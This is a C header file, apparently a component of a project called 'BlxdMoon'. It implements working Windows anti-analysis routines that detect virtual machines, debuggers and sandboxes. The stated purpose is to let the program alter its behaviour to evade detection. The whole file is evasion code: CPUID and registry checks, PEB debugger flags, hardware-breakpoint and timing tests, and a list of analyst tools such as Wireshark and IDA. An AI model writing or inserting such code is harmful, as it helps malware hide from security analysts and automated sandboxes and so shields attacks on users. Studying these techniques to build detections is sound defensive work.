/**
 * anti_analysis.h - Anti-Analysis Techniques for BlxdMoon
 *
 * MITRE ATT&CK:
 *   T1497 - Virtualization/Sandbox Evasion
 *   T1497.001 - System Checks
 *   T1622 - Debugger Evasion
 *
 * Purpose: Detect analysis environments (VMs, debuggers, sandboxes)
 * and alter behavior to evade detection.
 */

#ifndef ANTI_ANALYSIS_H
#define ANTI_ANALYSIS_H

#include <windows.h>
#include <winternl.h>
#include <tlhelp32.h>
#include <intrin.h>

// ============================================================
// VM Detection
// ============================================================

/**
 * Check for hypervisor presence using CPUID
 * Bit 31 of ECX (leaf 1) indicates hypervisor
 */
static inline BOOL IsVM_CPUID(void) {
    int cpuInfo[4] = {0};
    __cpuid(cpuInfo, 1);
    return (cpuInfo[2] >> 31) & 1;
}

/**
 * Get hypervisor vendor string via CPUID
 * Returns TRUE if a known VM vendor is detected
 */
static inline BOOL IsVM_VendorString(void) {
    int cpuInfo[4] = {0};
    char vendor[13] = {0};

    __cpuid(cpuInfo, 0x40000000);

    memcpy(vendor, &cpuInfo[1], 4);      // EBX
    memcpy(vendor + 4, &cpuInfo[2], 4);  // ECX
    memcpy(vendor + 8, &cpuInfo[3], 4);  // EDX

    // Known hypervisor vendors
    const char *vmVendors[] = {
        "VMwareVMware",     // VMware
        "Microsoft Hv",     // Hyper-V
        "VBoxVBoxVBox",     // VirtualBox
        "KVMKVMKVM",        // KVM
        "XenVMMXenVMM",     // Xen
        "paborPparlo",      // Parallels
        NULL
    };

    for (int i = 0; vmVendors[i]; i++) {
        if (strcmp(vendor, vmVendors[i]) == 0) {
            return TRUE;
        }
    }

    return FALSE;
}

/**
 * Check for VM-specific registry keys
 */
static inline BOOL IsVM_Registry(void) {
    const char *vmKeys[] = {
        // VMware
        "SOFTWARE\\VMware, Inc.\\VMware Tools",
        "SYSTEM\\CurrentControlSet\\Services\\vmci",
        "SYSTEM\\CurrentControlSet\\Services\\vmhgfs",
        "SYSTEM\\CurrentControlSet\\Services\\vmmouse",
        "SYSTEM\\CurrentControlSet\\Services\\vmrawdsk",
        "SYSTEM\\CurrentControlSet\\Services\\vmusbmouse",

        // VirtualBox
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxGuest",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxMouse",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxSF",
        "SYSTEM\\CurrentControlSet\\Services\\VBoxVideo",

        // Hyper-V
        "SOFTWARE\\Microsoft\\Virtual Machine\\Guest\\Parameters",
        "SYSTEM\\CurrentControlSet\\Services\\vmicheartbeat",

        // QEMU
        "SYSTEM\\CurrentControlSet\\Services\\QEMU",

        NULL
    };

    HKEY hKey;
    for (int i = 0; vmKeys[i]; i++) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, vmKeys[i], 0,
                          KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return TRUE;
        }
    }

    return FALSE;
}

/**
 * Check for VM-specific processes
 */
static inline BOOL IsVM_Process(void) {
    const char *vmProcesses[] = {
        // VMware
        "vmtoolsd.exe",
        "vmwaretray.exe",
        "vmwareuser.exe",
        "vmacthlp.exe",

        // VirtualBox
        "VBoxService.exe",
        "VBoxTray.exe",

        // Hyper-V / Windows Sandbox
        "vmcompute.exe",
        "vmwp.exe",

        // QEMU
        "qemu-ga.exe",

        // Parallels
        "prl_cc.exe",
        "prl_tools.exe",

        NULL
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32 pe = {sizeof(pe)};
    BOOL found = FALSE;

    if (Process32First(hSnapshot, &pe)) {
        do {
            for (int i = 0; vmProcesses[i]; i++) {
                if (_stricmp(pe.szExeFile, vmProcesses[i]) == 0) {
                    found = TRUE;
                    break;
                }
            }
        } while (!found && Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return found;
}

/**
 * Check for VM-specific files
 */
static inline BOOL IsVM_Files(void) {
    const char *vmFiles[] = {
        "C:\\Windows\\System32\\drivers\\vmhgfs.sys",      // VMware
        "C:\\Windows\\System32\\drivers\\vmmouse.sys",     // VMware
        "C:\\Windows\\System32\\drivers\\VBoxMouse.sys",   // VirtualBox
        "C:\\Windows\\System32\\drivers\\VBoxGuest.sys",   // VirtualBox
        "C:\\Windows\\System32\\drivers\\VBoxSF.sys",      // VirtualBox
        NULL
    };

    for (int i = 0; vmFiles[i]; i++) {
        if (GetFileAttributesA(vmFiles[i]) != INVALID_FILE_ATTRIBUTES) {
            return TRUE;
        }
    }

    return FALSE;
}

/**
 * Combined VM detection with scoring
 */
static inline BOOL IsVirtualMachine(void) {
    int score = 0;

    if (IsVM_CPUID()) score += 3;
    if (IsVM_VendorString()) score += 3;
    if (IsVM_Registry()) score += 2;
    if (IsVM_Process()) score += 2;
    if (IsVM_Files()) score += 2;

    // Threshold: 3+ points indicates VM
    return score >= 3;
}

// ============================================================
// Debugger Detection
// ============================================================

/**
 * Check using Windows API
 */
static inline BOOL IsDebugger_API(void) {
    return IsDebuggerPresent();
}

/**
 * Check BeingDebugged flag in PEB directly
 */
static inline BOOL IsDebugger_PEB(void) {
#ifdef _WIN64
    PPEB pPeb = (PPEB)__readgsqword(0x60);
#else
    PPEB pPeb = (PPEB)__readfsdword(0x30);
#endif
    return pPeb->BeingDebugged;
}

/**
 * Check NtGlobalFlag in PEB
 * Debuggers set heap flags that persist here
 */
static inline BOOL IsDebugger_NtGlobalFlag(void) {
#ifdef _WIN64
    DWORD *pNtGlobalFlag = (DWORD*)(__readgsqword(0x60) + 0xBC);
#else
    DWORD *pNtGlobalFlag = (DWORD*)(__readfsdword(0x30) + 0x68);
#endif

    // FLG_HEAP_ENABLE_TAIL_CHECK (0x10) |
    // FLG_HEAP_ENABLE_FREE_CHECK (0x20) |
    // FLG_HEAP_VALIDATE_PARAMETERS (0x40)
    const DWORD debuggerFlags = 0x70;

    return (*pNtGlobalFlag & debuggerFlags) != 0;
}

/**
 * Check for hardware breakpoints in debug registers
 */
static inline BOOL IsDebugger_HardwareBreakpoints(void) {
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    if (!GetThreadContext(GetCurrentThread(), &ctx)) {
        return FALSE;
    }

    // Dr0-Dr3 hold breakpoint addresses
    return (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3);
}

/**
 * Timing-based detection
 * Debugging causes significant slowdown
 */
static inline BOOL IsDebugger_Timing(void) {
    LARGE_INTEGER freq, start, end;
    QueryPerformanceFrequency(&freq);
    QueryPerformanceCounter(&start);

    // Simple operation that should be fast
    volatile int x = 0;
    for (int i = 0; i < 1000; i++) {
        x += i;
    }

    QueryPerformanceCounter(&end);

    // Calculate elapsed time in seconds
    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;

    // If more than 100ms for this loop, likely being debugged
    return elapsed > 0.1;
}

/**
 * Check for debug port via NtQueryInformationProcess
 */
static inline BOOL IsDebugger_DebugPort(void) {
    typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
        HANDLE, ULONG, PVOID, ULONG, PULONG
    );

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    pNtQueryInformationProcess NtQueryInformationProcess =
        (pNtQueryInformationProcess)GetProcAddress(hNtdll, "NtQueryInformationProcess");

    if (!NtQueryInformationProcess) return FALSE;

    HANDLE debugPort = 0;
    NTSTATUS status = NtQueryInformationProcess(
        GetCurrentProcess(),
        7,  // ProcessDebugPort
        &debugPort,
        sizeof(debugPort),
        NULL
    );

    if (status == 0 && debugPort != 0) {
        return TRUE;
    }

    return FALSE;
}

/**
 * Combined debugger detection
 */
static inline BOOL IsDebuggerPresent_Advanced(void) {
    return IsDebugger_API() ||
           IsDebugger_PEB() ||
           IsDebugger_NtGlobalFlag() ||
           IsDebugger_HardwareBreakpoints() ||
           IsDebugger_DebugPort() ||
           IsDebugger_Timing();
}

// ============================================================
// Sandbox Detection
// ============================================================

/**
 * Check system uptime
 * Sandboxes typically have very low uptime
 */
static inline BOOL IsSandbox_Uptime(void) {
    DWORD uptime = GetTickCount();

    // Less than 10 minutes = suspicious
    const DWORD tenMinutes = 10 * 60 * 1000;
    return uptime < tenMinutes;
}

/**
 * Check available memory
 * Sandboxes often have limited RAM
 */
static inline BOOL IsSandbox_Memory(void) {
    MEMORYSTATUSEX mem = {sizeof(mem)};
    GlobalMemoryStatusEx(&mem);

    // Less than 4 GB = suspicious
    const ULONGLONG fourGB = 4ULL * 1024 * 1024 * 1024;
    return mem.ullTotalPhys < fourGB;
}

/**
 * Check CPU core count
 * Sandboxes often have 1-2 cores
 */
static inline BOOL IsSandbox_CPU(void) {
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    return si.dwNumberOfProcessors < 2;
}

/**
 * Check disk size
 * Sandboxes often have small disks
 */
static inline BOOL IsSandbox_DiskSize(void) {
    ULARGE_INTEGER freeBytesAvailable, totalBytes, totalFreeBytes;

    if (GetDiskFreeSpaceExA("C:\\", &freeBytesAvailable,
                             &totalBytes, &totalFreeBytes)) {
        // Less than 60 GB = suspicious
        const ULONGLONG sixtyGB = 60ULL * 1024 * 1024 * 1024;
        return totalBytes.QuadPart < sixtyGB;
    }

    return FALSE;
}

/**
 * Check for recent user files
 * Real systems have documents, sandboxes are often empty
 */
static inline BOOL IsSandbox_NoUserFiles(void) {
    WIN32_FIND_DATAA fd;
    char path[MAX_PATH];

    ExpandEnvironmentStringsA("%USERPROFILE%\\Documents\\*", path, MAX_PATH);
    HANDLE hFind = FindFirstFileA(path, &fd);

    if (hFind == INVALID_HANDLE_VALUE) {
        return TRUE;
    }

    int fileCount = 0;
    do {
        if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
            fileCount++;
        }
    } while (FindNextFileA(hFind, &fd) && fileCount < 10);

    FindClose(hFind);

    // Less than 5 files = suspicious
    return fileCount < 5;
}

/**
 * Check for common applications
 * Real systems have browsers, Office, etc.
 */
static inline BOOL IsSandbox_NoCommonApps(void) {
    const char *commonApps[] = {
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe",
        "C:\\Program Files\\Mozilla Firefox\\firefox.exe",
        "C:\\Program Files (x86)\\Mozilla Firefox\\firefox.exe",
        "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        "C:\\Program Files (x86)\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
        NULL
    };

    int foundCount = 0;
    for (int i = 0; commonApps[i]; i++) {
        if (GetFileAttributesA(commonApps[i]) != INVALID_FILE_ATTRIBUTES) {
            foundCount++;
        }
    }

    return foundCount == 0;
}

/**
 * Check screen resolution
 * Sandboxes often use small/unusual resolutions
 */
static inline BOOL IsSandbox_Resolution(void) {
    int width = GetSystemMetrics(SM_CXSCREEN);
    int height = GetSystemMetrics(SM_CYSCREEN);

    // Small or exact 1024x768 indicates sandbox
    if (width < 1024 || height < 768) return TRUE;
    if (width == 1024 && height == 768) return TRUE;

    return FALSE;
}

/**
 * Check for analysis tools processes
 */
static inline BOOL IsSandbox_AnalysisTools(void) {
    const char *analysisProcs[] = {
        "procmon.exe",
        "procmon64.exe",
        "procexp.exe",
        "procexp64.exe",
        "wireshark.exe",
        "fiddler.exe",
        "x64dbg.exe",
        "x32dbg.exe",
        "ollydbg.exe",
        "ida.exe",
        "ida64.exe",
        "idaq.exe",
        "idaq64.exe",
        "immunitydebugger.exe",
        "windbg.exe",
        "dnspy.exe",
        "pe-bear.exe",
        "pestudio.exe",
        "regmon.exe",
        "filemon.exe",
        "autoruns.exe",
        "tcpview.exe",
        "processhacker.exe",
        NULL
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return FALSE;

    PROCESSENTRY32 pe = {sizeof(pe)};
    BOOL found = FALSE;

    if (Process32First(hSnapshot, &pe)) {
        do {
            for (int i = 0; analysisProcs[i]; i++) {
                if (_stricmp(pe.szExeFile, analysisProcs[i]) == 0) {
                    found = TRUE;
                    break;
                }
            }
        } while (!found && Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return found;
}

/**
 * Combined sandbox detection with weighted scoring
 */
static inline BOOL IsSandbox(void) {
    int score = 0;

    if (IsSandbox_Uptime()) score += 2;
    if (IsSandbox_Memory()) score += 2;
    if (IsSandbox_CPU()) score += 2;
    if (IsSandbox_DiskSize()) score += 1;
    if (IsSandbox_NoUserFiles()) score += 2;
    if (IsSandbox_NoCommonApps()) score += 1;
    if (IsSandbox_Resolution()) score += 1;
    if (IsSandbox_AnalysisTools()) score += 3;

    // Threshold: 4+ points indicates sandbox
    return score >= 4;
}

// ============================================================
// Combined Analysis Environment Detection
// ============================================================

/**
 * Check if running in any analysis environment
 * Returns TRUE if VM, debugger, or sandbox detected
 */
static inline BOOL IsAnalysisEnvironment(void) {
    return IsVirtualMachine() ||
           IsDebuggerPresent_Advanced() ||
           IsSandbox();
}

#endif // ANTI_ANALYSIS_H
